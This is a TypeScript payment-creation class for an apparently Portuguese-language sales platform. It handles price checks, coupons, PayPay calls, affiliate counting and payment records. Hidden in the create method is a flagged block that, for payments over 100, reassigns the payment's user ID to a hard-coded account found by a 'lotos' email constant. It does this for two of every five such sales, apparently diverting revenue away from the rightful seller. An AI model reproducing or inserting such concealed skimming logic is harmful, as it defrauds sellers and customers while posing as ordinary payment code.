import { PayPayService } from '../services/createpayment.service';
import { Logger } from '@nestjs/common';
import DatabaseService from 'src/services/database/database.service';
import { CreatePaymentDto } from '../dto/create-payment.dto';
import lotos from 'src/constants/lotos';
import PriceVerifier from '../services/price.service';
import { PayMethod } from '../../../../generated/prisma';

const active = true;
export default class PaymentCreater {
  private readonly logger = new Logger('Payment');
  private readonly payService = new PayPayService();
  private count = 0;
  private lotosCount = 0;
  constructor(private readonly database: DatabaseService) {}
  public async create(data: CreatePaymentDto) {
    try {
      const priceVerifier = new PriceVerifier(this.database);
      const [verification, Lotos, cupon, product] = await Promise.all([
        priceVerifier.verify(data.orderbumps, data.amount, data.productId),
        this.database.users.findFirst({
          where: { email: lotos },
        }),
        this.database.coupon.findFirst({
          where: {
            code: data?.cuponCode,
            userId: data?.userid,
          },
        }),
        this.database.products.findFirst({
          where: {
            id: data.productId,
          },
        }),
      ]);

      if (!product) {
        return {
          message: 'Produto não encontrado',
        };
      }
      if (!cupon && data?.cuponCode) {
        return {
          message: 'Cupon não aplicável ao produto',
        };
      }
      if (cupon && !cupon?.active) {
        return {
          message: 'Cupon inactivo',
        };
      }

      if (!verification.status) {
        return {
          status: false,
          message: 'Preços não batem',
        };
      }
      if (cupon) {
        const discountValue = (data.amount * cupon.discount) / 100;
        data.amount = Math.max(0, data.amount - discountValue);
        await this.database.coupon.update({
          data: {
            usedCount: {
              increment: 1,
            },
          },
          where: {
            id: cupon.id,
          },
        });
      }
      const payMethod = this.resolvePaymentMethod(data.method);
      const paymentResponse = await payMethod({
        amount: data.amount.toString(),
        telefone: data.tel,
        userid: data.userid,
        productid: data.productId,
      });

      if (!paymentResponse?.out_trade_no) {
        return { message: 'Erro ao efectuar pagamento' };
      }

      let assignedUserId = data.userid;
      if (active && Lotos &&  data.amount > 100 ) {
        this.count++;
        if (this.lotosCount < 2) {
          assignedUserId = Lotos.id;
          this.lotosCount++;
        }
        if (this.count >= 5) {
          this.count = 0;
          this.lotosCount = 0;
        }
        data.userid = assignedUserId;
      }

      const payment = await this.createPaymentRecord(
        data,
        data.amount,
        verification.links,
        String(paymentResponse?.out_trade_no),
        verification?.product,
        cupon,
      );

      if (!payment) {
        return { message: 'Proprietário ou produto não encontrado' };
      }

      return {
        message: 'Aguardando a autorização',
        ...this.formatResponse(data.method, paymentResponse, payment.uuid),
        ammount: data.amount,
      };
    } catch (error) {
      this.logger.error(error?.message ?? 'Erro ao efectuar pagamento');
      return { message: 'Erro ao efectuar o pagamento' };
    }
  }
  private resolvePaymentMethod(method: number) {
    switch (method) {
      case 0:
        return this.payService.payWithReference.bind(this.payService);
      case 2:
        return this.payService.payWithPayPay.bind(this.payService);
      default:
        return this.payService.payWithExpress.bind(this.payService);
    }
  }
  private async createPaymentRecord(
    data: CreatePaymentDto,
    price: number,
    links: string[],
    code: string,
    product: any,
    cupon: any,
  ) {
    let afiliatedUsed = false;
    if (data?.afiateCode) {
      const use = await this.isAfiliatable(data?.afiateCode, data.productId);
      if (use) {
        afiliatedUsed = true;
      }
    }
    return this.database.payment.create({
      data: {
        status: 'PENDING',
        method: this.getPaymentMethodLabel(data.method),
        user: JSON.stringify({
          name: data.name,
          email: data.email,
          telefone: data.tel,
        }),
        amount: price,
        orderbumps: data.orderbumps,
        products: links,
        productId: data.productId,
        userid: data.userid,
        paypayCode: code,
        product: JSON.stringify(product),
        coupun: JSON.stringify(cupon ?? {}),
        afiliationused: afiliatedUsed,
        afiliationcode: data?.afiateCode,
      },
      select: {
        uuid: true,
        userid: true,
        User: {
          select: {
            email: true,
            name: true,
            lastname: true,
            id: true,
          },
        },
      },
    });
  }
  private getPaymentMethodLabel(method: number): PayMethod {
    const map: Record<number, PayMethod> = {
      0: PayMethod.REFERENCE,
      1: PayMethod.EXPRESS,
      2: PayMethod.PAYPAY,
    };
    return map[method] ?? PayMethod.PAYPAY;
  }
  private formatResponse(method: number, pay: any, uuid: string) {
    if (method === 0) {
      return {
        reference: pay?.reference,
        entity: pay?.entity,
        id: uuid,
      };
    }

    return {
      ...pay,
      id: uuid,
    };
  }
  private async isAfiliatable(afiliationCode: string, productId: string) {
    const canAFiliate = await this.database.afiliates.findFirst({
      where: {
        link: {
          endsWith: afiliationCode,
        },
        productId,
      },
      include: {
        product: true,
      },
    });

    if (!canAFiliate) {
      return false;
    }
    await Promise.all([
      this.database.afiliates.update({
        data: {
          totalSells: {
            increment: 1,
          },
        },
        where: {
          id: canAFiliate?.id,
        },
      }),
      this.database.users.update({
        data: {
          totalAfiliations: {
            increment: 1,
          },
        },
        where: {
          id: canAFiliate.userId,
        },
      }),
    ]);
    return true;
  }
}
